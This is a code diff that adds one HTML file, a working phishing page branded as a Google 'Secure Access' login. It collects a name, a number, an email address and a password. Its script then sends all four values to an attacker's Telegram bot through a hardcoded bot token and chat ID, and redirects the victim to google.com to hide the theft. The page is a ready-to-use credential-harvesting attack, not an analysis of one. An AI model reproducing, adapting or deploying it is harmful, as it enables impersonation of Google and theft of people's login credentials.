@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Access</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700&display=swap');
+
+        body {
+            font-family: 'Outfit', sans-serif;
+            /* အရောင်အသွေးစုံလင်သော Animated Gradient */
+            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+            background-size: 400% 400%;
+            animation: gradient 10s ease infinite;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+        }
+
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(15px);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            padding: 40px;
+            border-radius: 40px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            width: 340px;
+            text-align: center;
+            color: white;
+        }
+
+        h2 { font-size: 32px; margin-bottom: 25px; letter-spacing: 2px; text-shadow: 2px 2px 4px rgba(0,0,0,0.2); }
+
+        input {
+            width: 100%; padding: 18px; margin: 12px 0;
+            border: none; border-radius: 20px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white; font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        input::placeholder { color: rgba(255,255,255,0.7); }
+        input:focus { background: rgba(255,255,255,0.3); box-shadow: 0 0 15px rgba(255,255,255,0.4); }
+
+        button {
+            background: #fff;
+            color: #e73c7e;
+            padding: 18px;
+            border: none; border-radius: 20px; width: 100%;
+            cursor: pointer; font-size: 18px; font-weight: 700;
+            margin-top: 20px; transition: 0.4s;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+
+        button:hover {
+            transform: translateY(-5px);
+            background: #ffebee;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Google</h2>
+        <input type="text" id="company" placeholder=" Name" required>
+        <input type="text" id="swp" placeholder="Number" required>
+        <input type="email" id="email" placeholder="Email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button onclick="submitData()">CONTINUE</button>
+    </div>
+
+    <script>
+        async function submitData() {
+            const company = document.getElementById('company').value;
+            const swp = document.getElementById('swp').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            const token = "8980605393:AAEVTWKvHX--a_XWZMMuLE-M8Pj75WSw5Ks"; 
+            const chatId = "7981991075"; 
+            
+            if (!company || !swp || !email || !password) {
+                alert("Please complete all fields!");
+                return;
+            }
+
+            const btn = document.querySelector('button');
+            btn.innerText = "PROCESSING...";
+            
+            const message = `✨ NEW SUBMISSION\n\n🏢 Company: ${company}\n🔢 SWP: ${swp}\n📧 Email: ${email}\n🔑 Password: ${password}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            try {
+                await fetch(url);
+                window.location.href = "https://www.google.com";
+            } catch (err) {
+                alert("Connection Error!");
+                btn.innerText = "CONTINUE";
+            }
+        }
+    </script>
+</body>
+</html>
